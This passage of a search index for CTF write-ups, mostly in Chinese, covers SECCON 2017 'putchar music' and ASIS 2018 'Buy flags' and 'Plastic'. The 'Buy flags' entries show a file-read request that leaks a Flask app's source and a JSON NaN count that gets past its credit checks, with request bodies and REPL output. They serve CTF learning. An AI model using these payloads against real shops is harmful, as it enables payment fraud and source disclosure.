t = 1 ; i = ( i + 1 ) % ( sizeof ( p ) - 1 )){ double x = pow ( 1.05946309435931 , p [ i ] / 6 + 13 ); for ( j = 1 + p [ i ] % 6 ; t ++% ( 8192 / j );) putchar ( t >> 5 | ( int )( t * x ));}} Solution I found a cool video \" Creating music in one line of C code \"on Youtube, and it looked similar to this challenge. Here is the instructions mentioned below the video: Compile source code (main.c) gcc main.c -lm Play with mplayer ./a.out | mplayer -demuxer rawaudio -rawaudio rate = 8000 :channels = 1 :samplesize = 1 - Then you will get a cool music like this !!","title":"putchar music"},{"location":"Writeups/2017/seccon_CTF/putchar_music/#putchar-music","text":"Challenge Link: putchar_music Category: programming Writeup: putchar music This one line of C program works on Linux Desktop. What is this movie's title? Please answer the flag as SECCON{MOVIES_TITLE}, replace all alphabets with capital letters, and spaces with underscores. main ( t , i , j ){ unsigned char p [] = \"###<f_YM \\204 g_YM \\204 g_Y_H #<f_YM \\204 g_YM \\204 g_Y_H #+-?[WKAMYJ/7 #+-?[WKgH #+-?[WKAMYJ/7hk \\206\\203 tk \\\\ YJAfkkk\" ; for ( i = 0 ; t = 1 ; i = ( i + 1 ) % ( sizeof ( p ) - 1 )){ double x = pow ( 1.05946309435931 , p [ i ] / 6 + 13 ); for ( j = 1 + p [ i ] % 6 ; t ++% ( 8192 / j );) putchar ( t >> 5 | ( int )( t * x ));}}","title":"putchar music"},{"location":"Writeups/2017/seccon_CTF/putchar_music/#solution","text":"I found a cool video \" Creating music in one line of C code \"on Youtube, and it looked similar to this challenge. Here is the instructions mentioned below the video: Compile source code (main.c) gcc main.c -lm Play with mplayer ./a.out | mplayer -demuxer rawaudio -rawaudio rate = 8000 :channels = 1 :samplesize = 1 - Then you will get a cool music like this !!","title":"Solution"},{"location":"Writeups/2018/ASIS_CTF_qual/Buy_flags/","text":"Buy flags Challenge Link: Buy flags Category: misc Writeup: Buy flags Here is an online shop that sells flags :) but we don\u2019t have enough money! Can you buy the flag? Observation \u9019\u662f\u4e00\u500b\u53ef\u4ee5\u8cfc\u8cb7 flag \u7684\u7db2\u7ad9\uff0c\u53ef\u4ee5\u52fe\u9078\u60f3\u8981\u7684 flag\uff0c\u7136\u5f8c\u8f38\u5165 coupon\uff0c\u4e0d\u904e credit \u662f 0\uff0c\u4e5f\u4e0d\u77e5\u9053 coupon \u662f\u5565\uff0c\u6240\u4ee5\u90fd\u53ea\u6703\u56de\u50b3 \"your credit not enough\" pay API \u6309\u4e0b pay \u4ee5\u5f8c\u6703 POST \u5230 http://46.101.173.61/pay \u50b3\u7684\u5167\u5bb9\u6709 coupon \u4ee5\u53ca\u9ede\u9078\u7684 flag \u9805\u76ee\u53ca\u6578\u91cf { \"card\" : [{ \"name\" : \"asis\" , \"count\" : 1 }], \"coupon\" : \"YWJj\" } \u7d50\u679c\u4e5f\u662f\u7528 json \u56de\u50b3 { \"result\" : \"your credit not enough\" } \u9019\u908a\u6709\u5617\u8a66\u628a count \u6539\u6210 0 \u6216\u662f -1\uff0c\u4e0d\u904e server \u90fd\u6709\u8655\u7406\u6389 { \"card\" :[{ \"name\" : \"asis\" , \"count\" : -1 }], \"coupon\" : \"aA==\" } { \"result\" : \"item count must be greater than zero\" } image API \u6aa2\u67e5\u539f\u59cb\u78bc\u4ee5\u5f8c\u767c\u73fe\u5716\u7247\u662f\u7531 http://46.101.173.61/image?name=asis.png \u50b3\u904e\u4f86\u7684\uff0c\u770b\u8d77\u4f86\u61c9\u8a72\u662f\u53ef\u4ee5\u505a LFI\uff0c\u4e0d\u904e\u7d93\u904e\u6e2c\u8a66\u5f8c\u767c\u73fe\u53ea\u8981\u8f38\u5165 / \u6216 .. \u5c31\u6703\u56de\u50b3 Access Denied \uff0c\u731c\u6e2c\u53ef\u80fd server \u7684\u6a94\u6848\u4e5f\u653e\u5728\u7576\u524d\u76ee\u9304\uff0c\u6240\u4ee5\u8a66\u4e86 server.py \uff0c\u4f46\u4e5f\u6c92\u62ff\u5230 flask session Cookie \u7684\u90e8\u5206\u6709\u4e00\u500b session\uff0c\u4e4d\u770b\u4e4b\u4e0b\u4ee5\u70ba\u662f jwt\uff0c\u7b2c\u4e00\u6bb5\u53ef\u4ee5\u89e3\u51fa data\uff0c\u4f46\u5176\u4ed6\u5169\u6bb5\u5c31\u5b8c\u5168\u4e0d\u80fd\u89e3\u4e86 \u5f8c\u4f86\u67e5\u4e86\u4e00\u4e0b\u624d\u77e5\u9053\u662f flask session\uff0c\u5f8c\u9762\u5169\u6bb5\u662f\u7528\u4f86\u9a57\u8b49\u7b2c\u4e00\u6bb5\u7684 data \u7684\uff0c\u9700\u8981\u6709 secret key \u624d\u80fd\u507d\u9020 eyJjb3Vwb25zIjpbXSwiY3JlZGl0IjowfQ.Dctipw.Q8aC2jTPn9lLxZQU-0Fc3oBx3Ig { \"coupons\" :[], \"credit\" : 0 } Solution \u89e3\u6cd5\u7684\u90e8\u5206\u662f\u5728\u8cfd\u5f8c\u53c3\u7167 Writeup \u7684 Source code \u9996\u5148\u662f\u53ef\u4ee5\u5229\u7528 image API \u62ff\u5230 app.py (flask \u7684\u9810\u8a2d server file) http://46.101.173.61/image?name=app.py \u5176\u4e2d\uff0cflag \u662f\u653e\u5728 private/flag.txt\uff0csecret key \u5247\u662f\u653e\u5728 private/secret.txt 4 app . secret_key = open ( 'private/secret.txt' ) . read () 20 'data' : open ( 'private/flag.txt' ) . read () \u770b\u4e00\u4e0b image API \u7684\u5beb\u6cd5\uff0c\u5df2\u7d93\u628a private \u5e95\u4e0b\u7684\u6a94\u6848\u6ffe\u6389\u4e86 if '/' in image_name or '..' in image_name or 'private' in image_name : return 'Access Denied' json NaN \u6700\u5f8c\u7684\u89e3\u6cd5\u662f\u5728 pay API \u628a\u6578\u91cf\u6539\u6210 NaN \u5c31\u53ef\u4ee5\u62ff\u5230 flag \u4e86 \u539f\u59cb\u78bc\u4e2d\uff0ccount \u7684\u9a57\u8b49\u5982\u4e0b data = request . get_json () card = data [ 'card' ] for flag in card : if flag [ 'count' ] <= 0 : return jsonify ({ 'result' : 'item count must be greater than zero' }) \u5be6\u969b\u6e2c\u8a66\u4e00\u4e0b\uff0cNaN \u5728 parse \u5f8c\u662f float\uff0c\u4e14\u53ef\u4ee5\u901a\u904e <= 0 \u7684\u9a57\u8b49 >>> text = '{\"var\":NaN}' >>> data = json . loads ( text ) >>> print data { u 'var' : nan } >>> data [ 'var' ] nan >>> type ( data [ 'var' ]) < type 'float' > >>> data [ 'var' ] <= 0 False \u63a5\u4e0b\u4f86\u5728\u8a08\u7b97 credit \u6642\u7684\u9a57\u8b49\u65b9\u6cd5\u5982\u4e0b for flag in card : credit -= flag [ 'count' ] * flags [ flag [ 'name' ]][ 'price' ] if credit < 0 : result = { 'result' : 'your credit not enough' } \u5be6\u969b\u6e2c\u8a66\u5f8c\u767c\u73fe\uff0c\u53ea\u8981\u64cd\u4f5c\u6d41\u7a0b\u4e2d\u6709\u7528\u5230 nan\uff0c\u8a72\u8b8a\u6578\u5c31\u6703\u88ab\u8a2d\u6210 nan\uff0c\u4e5f\u5c31\u53ef\u4ee5\u9806\u5229\u901a\u904e\u9a57\u8b49\u4e86 >>> credit = 0 >>> credit -= data [ 'var' ] * 110 >>> credit nan >>> credit < 0 False","title":"Buy flags"},{"location":"Writeups/2018/ASIS_CTF_qual/Buy_flags/#buy-flags","text":"Challenge Link: Buy flags Category: misc Writeup: Buy flags Here is an online shop that sells flags :) but we don\u2019t have enough money! Can you buy the flag?","title":"Buy flags"},{"location":"Writeups/2018/ASIS_CTF_qual/Buy_flags/#observation","text":"\u9019\u662f\u4e00\u500b\u53ef\u4ee5\u8cfc\u8cb7 flag \u7684\u7db2\u7ad9\uff0c\u53ef\u4ee5\u52fe\u9078\u60f3\u8981\u7684 flag\uff0c\u7136\u5f8c\u8f38\u5165 coupon\uff0c\u4e0d\u904e credit \u662f 0\uff0c\u4e5f\u4e0d\u77e5\u9053 coupon \u662f\u5565\uff0c\u6240\u4ee5\u90fd\u53ea\u6703\u56de\u50b3 \"your credit not enough\"","title":"Observation"},{"location":"Writeups/2018/ASIS_CTF_qual/Buy_flags/#pay-api","text":"\u6309\u4e0b pay \u4ee5\u5f8c\u6703 POST \u5230 http://46.101.173.61/pay \u50b3\u7684\u5167\u5bb9\u6709 coupon \u4ee5\u53ca\u9ede\u9078\u7684 flag \u9805\u76ee\u53ca\u6578\u91cf { \"card\" : [{ \"name\" : \"asis\" , \"count\" : 1 }], \"coupon\" : \"YWJj\" } \u7d50\u679c\u4e5f\u662f\u7528 json \u56de\u50b3 { \"result\" : \"your credit not enough\" } \u9019\u908a\u6709\u5617\u8a66\u628a count \u6539\u6210 0 \u6216\u662f -1\uff0c\u4e0d\u904e server \u90fd\u6709\u8655\u7406\u6389 { \"card\" :[{ \"name\" : \"asis\" , \"count\" : -1 }], \"coupon\" : \"aA==\" } { \"result\" : \"item count must be greater than zero\" }","title":"pay API"},{"location":"Writeups/2018/ASIS_CTF_qual/Buy_flags/#image-api","text":"\u6aa2\u67e5\u539f\u59cb\u78bc\u4ee5\u5f8c\u767c\u73fe\u5716\u7247\u662f\u7531 http://46.101.173.61/image?name=asis.png \u50b3\u904e\u4f86\u7684\uff0c\u770b\u8d77\u4f86\u61c9\u8a72\u662f\u53ef\u4ee5\u505a LFI\uff0c\u4e0d\u904e\u7d93\u904e\u6e2c\u8a66\u5f8c\u767c\u73fe\u53ea\u8981\u8f38\u5165 / \u6216 .. \u5c31\u6703\u56de\u50b3 Access Denied \uff0c\u731c\u6e2c\u53ef\u80fd server \u7684\u6a94\u6848\u4e5f\u653e\u5728\u7576\u524d\u76ee\u9304\uff0c\u6240\u4ee5\u8a66\u4e86 server.py \uff0c\u4f46\u4e5f\u6c92\u62ff\u5230","title":"image API"},{"location":"Writeups/2018/ASIS_CTF_qual/Buy_flags/#flask-session","text":"Cookie \u7684\u90e8\u5206\u6709\u4e00\u500b session\uff0c\u4e4d\u770b\u4e4b\u4e0b\u4ee5\u70ba\u662f jwt\uff0c\u7b2c\u4e00\u6bb5\u53ef\u4ee5\u89e3\u51fa data\uff0c\u4f46\u5176\u4ed6\u5169\u6bb5\u5c31\u5b8c\u5168\u4e0d\u80fd\u89e3\u4e86 \u5f8c\u4f86\u67e5\u4e86\u4e00\u4e0b\u624d\u77e5\u9053\u662f flask session\uff0c\u5f8c\u9762\u5169\u6bb5\u662f\u7528\u4f86\u9a57\u8b49\u7b2c\u4e00\u6bb5\u7684 data \u7684\uff0c\u9700\u8981\u6709 secret key \u624d\u80fd\u507d\u9020 eyJjb3Vwb25zIjpbXSwiY3JlZGl0IjowfQ.Dctipw.Q8aC2jTPn9lLxZQU-0Fc3oBx3Ig { \"coupons\" :[], \"credit\" : 0 }","title":"flask session"},{"location":"Writeups/2018/ASIS_CTF_qual/Buy_flags/#solution","text":"\u89e3\u6cd5\u7684\u90e8\u5206\u662f\u5728\u8cfd\u5f8c\u53c3\u7167 Writeup \u7684","title":"Solution"},{"location":"Writeups/2018/ASIS_CTF_qual/Buy_flags/#source-code","text":"\u9996\u5148\u662f\u53ef\u4ee5\u5229\u7528 image API \u62ff\u5230 app.py (flask \u7684\u9810\u8a2d server file) http://46.101.173.61/image?name=app.py \u5176\u4e2d\uff0cflag \u662f\u653e\u5728 private/flag.txt\uff0csecret key \u5247\u662f\u653e\u5728 private/secret.txt 4 app . secret_key = open ( 'private/secret.txt' ) . read () 20 'data' : open ( 'private/flag.txt' ) . read () \u770b\u4e00\u4e0b image API \u7684\u5beb\u6cd5\uff0c\u5df2\u7d93\u628a private \u5e95\u4e0b\u7684\u6a94\u6848\u6ffe\u6389\u4e86 if '/' in image_name or '..' in image_name or 'private' in image_name : return 'Access Denied'","title":"Source code"},{"location":"Writeups/2018/ASIS_CTF_qual/Buy_flags/#json-nan","text":"\u6700\u5f8c\u7684\u89e3\u6cd5\u662f\u5728 pay API \u628a\u6578\u91cf\u6539\u6210 NaN \u5c31\u53ef\u4ee5\u62ff\u5230 flag \u4e86 \u539f\u59cb\u78bc\u4e2d\uff0ccount \u7684\u9a57\u8b49\u5982\u4e0b data = request . get_json () card = data [ 'card' ] for flag in card : if flag [ 'count' ] <= 0 : return jsonify ({ 'result' : 'item count must be greater than zero' }) \u5be6\u969b\u6e2c\u8a66\u4e00\u4e0b\uff0cNaN \u5728 parse \u5f8c\u662f float\uff0c\u4e14\u53ef\u4ee5\u901a\u904e <= 0 \u7684\u9a57\u8b49 >>> text = '{\"var\":NaN}' >>> data = json . loads ( text ) >>> print data { u 'var' : nan } >>> data [ 'var' ] nan >>> type ( data [ 'var' ]) < type 'float' > >>> data [ 'var' ] <= 0 False \u63a5\u4e0b\u4f86\u5728\u8a08\u7b97 credit \u6642\u7684\u9a57\u8b49\u65b9\u6cd5\u5982\u4e0b for flag in card : credit -= flag [ 'count' ] * flags [ flag [ 'name' ]][ 'price' ] if credit < 0 : result = { 'result' : 'your credit not enough' } \u5be6\u969b\u6e2c\u8a66\u5f8c\u767c\u73fe\uff0c\u53ea\u8981\u64cd\u4f5c\u6d41\u7a0b\u4e2d\u6709\u7528\u5230 nan\uff0c\u8a72\u8b8a\u6578\u5c31\u6703\u88ab\u8a2d\u6210 nan\uff0c\u4e5f\u5c31\u53ef\u4ee5\u9806\u5229\u901a\u904e\u9a57\u8b49\u4e86 >>> credit = 0 >>> credit -= data [ 'var' ] * 110 >>> credit nan >>> credit < 0 False","title":"json NaN"},{"location":"Writeups/2018/ASIS_CTF_qual/Plastic/","text":"Plastic Challenge Link: Plastic Category: misc Writeup: Plastic Are LaTeX and PlAsTiC the Same? It seems that they have very different compounds. Solution \u6a94\u6848\u8f09\u4e0b\u4f86\u662f\u4e00\u500b PNG \u6a94 % file plastic plastic: PNG image data, 1612 x 74, 8-bit/color RGBA, non-interlaced \u7528 strings \u770b\u4e00\u4e0b\uff0c\u53ef\u4ee5\u767c\u73fe\u5947\u602a\u7684\u8cc7\u6599 <x:xmpmeta xmlns:x= \"adobe:ns:meta/\" x:xmptk= \"XMP Core 5.4.0\" > <rdf:RDF xmlns:rdf= \"http://www.w3.org/1999/02/22-rdf-syntax-ns#\" > <rdf:Description rdf:about= \"\" xmlns:exif= \"http://ns.adobe.com/exif/1.0/\" xmlns:tiff= \"http://ns.adobe.com/tiff/1.0/\" > <exif:UserComment> <rdf:Alt> <rdf:li xml:lang= \"x-default\" > AAAFWHjabVRfbBRFGJ/ZOeifa+m2hVJaoNf2iohQtndX9ipS29IeVuwVe/1zbfc4 &#xA; 5/bm7pbu7V5255DjaDISozExaggxSIxC+2KRqBhjCPFBQwgmPggtSnySFx98IP57 &#xA; ML4590dEw2w2+33fzHzz+37fbyeW0TWbStIdKCDHuvUvngi7jxPL1kwj7DZjx4hK &#xA; 7Vk3ttSUxsOTbmpmGgB85cLHYntFZXtHp7trx2M7H9/1RI+/78DgoWeC4zNhJarG &#xA; U7pp0ym3kdX1tapqZ02TayYY6l4gOXuOf8t5p92qjm17pXZDnVjf0LhxExMYYg62 &#xA; jq1nFaySVbHqlc3NW1pat27b3sacrIZtYHWsnrWwVraNbWeucAzbRNcMMqWaumlN &#xA; ps04maIa1Uk4YxGcjukkksZJQ0toKqa8pMk4piQq1sWwupC0zKwRP1jYOGebWUsl &#xA; k+QE7QTlsbZ7j7N7rzQVDE0cGlKCoeLCUAarZFzcJXX3+fd5fL19/j6/S+qWJLnH &#xA; I/XxIXsLrkf2eX0Sj/YCEbLaVY/X1ztXKtbAaRIumcSeKadd2if/Y4aDofEiO6Jj &#xA; 1fnk/qdmOV02tTQjycQjPFH/0xx+MDSWpZhXFyrOLPcPyHxfyVkbch4cHgk88Dn0 &#xA; QcqtWJYSmzWwLawxKq4qcVPNpolBi0jme6QMjeSxRTVVJ4vVStYmvNIFnCTz3Cxg &#xA; tiP5IseLri4eibsSpsVfg7qK0Yd35HHatnPpGF+ZxjRl/3+uEHzU3HyWJvyRvGZk &#xA; OFJDLR2UyOouarpoLkNccc3ivOg5bmDV0jhWl5rCFlYp12t1QWajh8cuPss2XnyO &#xA; bWLN08FQgAO8c+T5CWdocmqa+yHtJOHEJAI6TtrcD/LCOgd2lhouiqyJbZ4eMw2s &#xA; mpzp2blyhqV5uWzxaOQoJ3RYUwtqwlZuKSLz4As4KjY8xHO8RP1STH5kvHNgqHTk &#xA; KnEmkoUfg2ocyOCXfrLwp/oT28pTasf4mcNcrUsLctkqKDK9Vwr0uPgDWG2h05mR &#xA; AGsr9fRAXoklXIOh0dCiku+V0l4l6stkbCWa7R1RomNeGXPx+5RofNyQlehonyFN &#xA; ECVKU96x9nZlkR+ZPR4VGx9I698al7MRuSi6wyRH4oPlq+B27uSkZZqUQVAJ6kEL &#xA; 6AR7gAfIYB5gkAIZkAenwevgDfAWOAPOgrfBOXAevAveAx+AS+Ay+Ah8Aj4Fn4HP &#xA; wVVwDXwBboBvwC3wPfgR3Ae/Qwesg82wDXZBD4xCDFWYgjY8BV+Gr8I34Tl4Hr4P &#xA; V+CH8DK8Aq/Dm/AWvAvvwfvwF/gb/EP4WvhWuC2sCd8Jd4UfhHvCz8Kvwl8IoCrk &#xA; RLWoDjWhVtSButBu1IP60SAKoHl0FNnoFHoJvYbOoLPoHXQBLaNL6Aq6iq6hr9B1 &#xA; dAPddFQ4ahwdjh0Ov2O/Y6DUQQGWr4s8+M9wDP0NfUGwlA== &#xA; </rdf:li> </rdf:Alt> </exif:UserComment> <tiff:Orientation> 1 </tiff:Orientation> </rdf:Description> </rdf:RDF> </x:xmpmeta> \u628a\u4e2d\u9593\u90a3\u6bb5\u6574\u7406\u4e00\u4e0b\uff0c\u770b\u8d77\u4f86\u662f 23 \u6bb5\u7d93\u904e base64 \u7684\u5b57\u4e32\uff0c\u4e0d\u904e\u89e3\u958b\u770b\u4e0d\u51fa\u4f86\u662f\u5565 AAAFWHjabVRfbBRFGJ/ZOeifa+m2hVJaoNf2iohQtndX9ipS29IeVuwVe/1zbfc4 5/bm7pbu7V5255DjaDISozExaggxSIxC+2KRqBhjCPFBQwgmPggtSnySFx98IP57 ML4590dEw2w2+33fzHzz+37fbyeW0TWbStIdKCDHuvUvngi7jxPL1kwj7DZjx4hK 7Vk3ttSUxsOTbmpmGgB85cLHYntFZXtHp7trx2M7H9/1RI+/78DgoWeC4zNhJarG U7pp0ym3kdX1tapqZ02TayYY6l4gOXuOf8t5p92qjm17pXZDnVjf0LhxExMYYg62 jq1nFaySVbHqlc3NW1pat27b3sacrIZtYHWsnrWwVraNbWeucAzbRNcMMqWaumlN ps04maIa1Uk4YxGcjukkksZJQ0toKqa8pMk4piQq1sWwupC0zKwRP1jYOGebWUsl k+QE7QTlsbZ7j7N7rzQVDE0cGlKCoeLCUAarZFzcJXX3+fd5fL19/j6/S+qWJLnH I/XxIXsLrkf2eX0Sj/YCEbLaVY/X1ztXKtbAaRIumcSeKadd2if/Y4aDofEiO6Jj 1fnk/qdmOV02tTQjycQjPFH/0xx+MDSWpZhXFyrOLPcPyHxfyVkbch4cHgk88Dn0 QcqtWJYSmzWwLawxKq4qcVPNpolBi0jme6QMjeSxRTVVJ4vVStYmvNIFnCTz3Cxg tiP5IseLri4eibsSpsVfg7qK0Yd35HHatnPpGF+ZxjRl/3+uEHzU3HyWJvyRvGZk OFJDLR2UyOouarpoLkNccc3ivOg5bmDV0jhWl5rCFlYp12t1QWajh8cuPss2XnyO bWLN08FQgAO8c+T5CWdocmqa+yHtJOHEJAI6TtrcD/LCOgd2lhouiqyJbZ4eMw2s mpzp2blyhqV5uWzxaOQoJ3RYUwtqwlZuKSLz4As4KjY8xHO8RP1STH5kvHNgqHTk KnEmkoUfg2ocyOCXfrLwp/oT28pTasf4mcNcrUsLctkqKDK9Vwr0uPgDWG2h05mR AGsr9fRAXoklXIOh0dCiku+V0l4l6stkbCWa7R1RomNeGXPx+5RofNyQlehonyFN ECVKU96x9nZlkR+ZPR4VGx9I698al7MRuSi6wyRH4oPlq+B27uSkZZqUQVAJ6kEL 6AR7gAfIYB5gkAIZkAenwevgDfAWOAPOgrfBOXAevAveAx+AS+Ay+Ah8Aj4Fn4HP wVVwDXwBboBvwC3wPfgR3Ae/Qwesg82wDXZBD4xCDFWYgjY8BV+Gr8I34Tl4Hr4P V+CH8DK8Aq/Dm/AWvAvvwfvwF/gb/EP4WvhWuC2sCd8Jd4UfhHvCz8Kvwl8IoCrk RLWoDjWhVtSButBu1IP60SAKoHl0FNnoFHoJvYbOoLPoHXQBLaNL6Aq6iq6hr9B1 dAPddFQ4ahwdjh0Ov2O/Y6DUQQGWr4s8+M9wDP0NfUGwlA== \u5f8c\u4f86\u5c07\u6240\u6709\u7684\u5b57\u4e32\u5408\u8d77\u4f86\u89e3\u958b\u5f8c\uff0c\u51fa\u73fe\u7684\u662f\u4e00\u500b data Orz \u63a5\u8457\u7528 binwalk \u8dd1\u4e00\u4e0b\uff0c\u767c\u73fe\u88e1\u9762\u9084\u6709\u88dd\u5176\u4ed6\u6771\u897f % file tmp tmp: data % binwalk tmp DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 4 0x4 Zlib compressed data, best compression \u89e3\u958b\u5f8c\u51fa\u73fe\u7684\u662f Apple binary property list \uff0c\u4e0d\u904e\u4e0d\u91cd\u8981\uff0c\u76f4\u63a5 strings \u5c31\u53ef\u4ee5\u5728\u88e1\u9762\u627e\u5230 flag \u4e86 % file 4 4: Apple binary property list % strings 4 | grep ASIS ={\\bf ASIS}\\{50m3\\_4pps\\_u5E\\_M37adat4\\_dOn7\\_I9n0Re\\_th3M!!\\}","title":"Plastic"},{"location":"Writeups/2018/ASIS_CTF_qual/Plastic/#plastic","text":"Challenge Link: Plastic Category: misc Writeup: Plastic Are LaTeX and PlAsTiC the Same? It seems that they have very different compounds.","title":"Plastic"},{"location":"Writeups/2018/ASIS_CTF_qual/Plastic/#solution","text":"\u6a94\u6848\u8f09\u4e0b\u4f86\u662f\u4e00\u500b PNG \u6a94 % file plastic plastic: PNG image data, 1612 x 74, 8-bit/color RGBA, non-interlaced \u7528 strings \u770b\u4e00\u4e0b\uff0c\u53ef\u4ee5\u767c\u73fe\u5947\u602a\u7684\u8cc7\u6599 <x:xmpmeta xmlns:x= \"adobe:ns:meta/\" x:xmptk= \"XMP Core 5.4.0\" > <rdf:RDF xmlns:rdf= \"http://www.w3.org/1999/02/22-rdf-syntax-ns#\" > <rdf:Description rdf:about= \"\" xmlns:exif= \"http://ns.adobe.com/exif/1.0/\" xmlns:tiff= \"http://ns.adobe.com/tiff/1.0/\" > <exif:UserComment> <rdf:Alt> <rdf:li xml:lang= \"x-default\" > AAAFWHjabVRfbBRFGJ/ZOeifa+m2hVJaoNf2iohQtndX9ipS29IeVuwVe/1zbfc4 &#xA; 5/bm7pbu7V5255DjaDISozExaggxSIxC+2KRqBhjCPFBQwgmPggtSnySFx98IP57 &#xA; ML4590dEw2w2+33fzHzz+37fbyeW0TWbStIdKCDHuvUvngi7jxPL1kwj7DZjx4hK &#xA; 7Vk3ttSUxsOTbmpmGgB85cLHYntFZXtHp7trx2M7H9/1RI+/78DgoWeC4zNhJarG &#xA; U7pp0ym3kdX1tapqZ02TayYY6l4gOXuOf8t5p92qjm17pXZDnVjf0LhxExMYYg62 &#xA; jq1nFaySVbHqlc3NW1pat27b3sacrIZtYHWsnrWwVraNbWeucAzbRNcMMqWaumlN &#xA; ps04maIa1Uk4YxGcjukkksZJQ0toKqa8pMk4piQq1sWwupC0zKwRP1jYOGebWUsl &#xA; k+QE7QTlsbZ7j7N7rzQVDE0cGlKCoeLCUAarZFzcJXX3+fd5fL19/j6/S+qWJLnH &#xA; I/XxIXsLrkf2eX0Sj/YCEbLaVY/X1ztXKtbAaRIumcSeKadd2if/Y4aDofEiO6Jj &#xA; 1fnk/qdmOV02tTQjycQjPFH/0xx+MDSWpZhXFyrOLPcPyHxfyVkbch4cHgk88Dn0 &#xA; QcqtWJYSmzWwLawxKq4qcVPNpolBi0jme6QMjeSxRTVVJ4vVStYmvNIFnCTz3Cxg &#xA; tiP5IseLri4eibsSpsVfg7qK0Yd35HHatnPpGF+ZxjRl/3+uEHzU3HyWJvyRvGZk &#xA; OFJDLR2UyOouarpoLkNccc3ivOg5bmDV0jhWl5rCFlYp12t1QWajh8cuPss2XnyO &#xA; bWLN08FQgAO8c+T5CWdocmqa+yHtJOHEJAI6TtrcD/LCOgd2lhouiqyJbZ4eMw2s &#xA; mpzp2blyhqV5uWzxaOQoJ3RYUwtqwlZuKSLz4As4KjY8xHO8RP1STH5kvHNgqHTk &#xA; KnEmkoUfg2ocyOCXfrLwp/oT28pTasf4mcNcrUsLctkqKDK9Vwr0uPgDWG2h05mR &#xA; AGsr9fRAXoklXIOh0dCiku+V0l4l6stkbCWa7R1RomNeGXPx+5RofNyQlehonyFN &#xA; ECVKU96x9nZlkR+ZPR4VGx9I698al7MRuSi6wyRH4oPlq+B27uSkZZqUQVAJ6kEL &#xA; 6AR7gAfIYB5gkAIZkAenwevgDfAWOAPOgrfBOXAevAveAx+AS+Ay+Ah8Aj4Fn4HP &#xA; wVVwDXwBboBvwC3wPfgR3Ae/Qwesg82wDXZBD4xCDFWYgjY8BV+Gr8I34Tl4Hr4P &#xA; V+CH8DK8Aq/Dm/AWvAvvwfvwF/gb/EP4WvhWuC2sCd8Jd4UfhHvCz8Kvwl8IoCrk &#xA; RLWoDjWhVtSButBu1IP60SAKoHl0FNnoFHoJvYbOoLPoHXQBLaNL6Aq6iq6hr9B1 &#xA; dAPddFQ4ahwdjh0Ov2O/Y6DUQQGWr4s8+M9wDP0NfUGwlA== &#xA; </rdf:li> </rdf:Alt> </exif:UserComment> <tiff:Orientation> 1 </tiff:Orientation> </rdf:Description> </rdf:RDF> </x:xmpmeta> \u628a\u4e2d\u9593\u90a3\u6bb5\u6574\u7406\u4e00\u4e0b\uff0c\u770b\u8d77\u4f86\u662f 23 \u6bb5\u7d93\u904e base64 \u7684\u5b57\u4e32\uff0c\u4e0d\u904e\u89e3\u958b\u770b\u4e0d\u51fa\u4f86\u662f\u5565 AAAFWHjabVRfbBRFGJ/ZOeifa+m2hVJaoNf2iohQtndX9ipS29IeVuwVe/1zbfc4 5/bm7pbu7V5255DjaDISozExaggxSIxC+2KRqBhjCPFBQwgmPggtSnySFx98IP57 ML4590dEw2w2+33fzHzz+37fbyeW0TWbStIdKCDHuvUvngi7jxPL1kwj7DZjx4hK 7Vk3ttSUxsOTbmpmGgB85cLHYntFZXtHp7trx2M7H9/1RI+/78DgoWeC4zNhJarG U7pp0ym3kdX1tapqZ02TayYY6l4gOXuOf8t5p92qjm17pXZDnVjf0LhxExMYYg62 jq1nFaySVbHqlc3NW1pat27b3sacrIZtYHWsnrWwVraNbWeucAzbRNcMMqWaumlN ps04maIa1Uk4YxGcjukkksZJQ0toKqa8pMk4piQq1sWwupC0zKwRP1jYOGebWUsl k+QE7QTlsbZ7j7N7rzQVDE0cGlKCoeLCUAarZFzcJXX3+fd5fL19/j6/S+qWJLnH I/XxIXsLrkf2eX0Sj/YCEbLaVY/X1ztXKtbAaRIumcSeKadd2if/Y4aDofEiO6Jj 1fnk/qdmOV02tTQjycQjPFH/0xx+MDSWpZhXFyrOLPcPyHxfyVkbch4cHgk88Dn0 QcqtWJYSmzWwLawxKq4qcVPNpolBi0jme6QMjeSxRTVVJ4vVStYmvNIFnCTz3Cxg tiP5IseLri4eibsSpsVfg7qK0Yd35HHatnPpGF+ZxjRl/3+uEHzU3HyWJvyRvGZk OFJDLR2UyOouarpoLkNccc3ivOg5bmDV0jhWl5rCFlYp12t1QWajh8cuPss2XnyO bWLN08FQgAO8c+T5CWdocmqa+yHtJOHEJAI6TtrcD/LCOgd2lhouiqyJbZ4eMw2s mpzp2blyhqV5uWzxaOQoJ3RYUwtqwlZuKSLz4As4KjY8xHO8RP1STH5kvHNgqHTk KnEmkoUfg2ocyOCXfrLwp/oT28pTasf4mcNcrUsLctkqKDK9Vwr0uPgDWG2h05mR AGsr9fRAXoklXIOh0dCiku+V0l4l6stkbCWa7R1RomNeGXPx+5RofNyQlehonyFN ECVKU96x9nZlkR+ZPR4VGx9I698al7MRuSi6wyRH4oPlq+B27uSkZZqUQVAJ6kEL 6AR7gAfIYB5gkAIZkAenwevgDfAWOAPOgrfBOXAevAveAx+AS+Ay+Ah8Aj4Fn4HP wVVwDXwBboBvwC3wPfgR3Ae/Qwesg82wDXZBD4xCDFWYgjY8BV+Gr8I34Tl4Hr4P V+CH8DK8Aq/Dm/AWvAvvwfvwF/gb/EP4WvhWuC2sCd8Jd4UfhHvCz8Kvwl8IoCrk RLWoDjWhVtSButBu1IP60SAKoHl0FNnoFHoJvYbOoLPoHXQBLaNL6Aq6iq6hr9B1 dAPddFQ4ahwdjh0Ov2O/Y6DUQQGWr4s8+M9wDP0NfUGwlA== \u5f8c\u4f86\u5c07\u6240\u6709\u7684\u5b57\u4e32\u5408\u8d77\u4f86\u89e3\u958b\u5f8c\uff0c\u51fa\u73fe\u7684\u662f\u4e00\u500b data Orz \u63a5\u8457\u7528 binwalk \u8dd1\u4e00\u4e0b\uff0c\u767c\u73fe\u88e1\u9762\u9084\u6709\u88dd\u5176\u4ed6\u6771\u897f % file tmp tmp: data % binwalk tmp DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 4 0x4 Zlib compressed data, best compression \u89e3\u958b\u5f8c\u51fa\u73fe\u7684\u662f Apple binary property list \uff0c\u4e0d\u904e\u4e0d\u91cd\u8981\uff0c\u76f4\u63a5 strings \u5c31\u53ef\u4ee5\u5728\u88e1\u9762\u627e\u5230 flag \u4e86 % file 4 4: Apple binary property list % strings 4 | grep ASIS ={\\bf 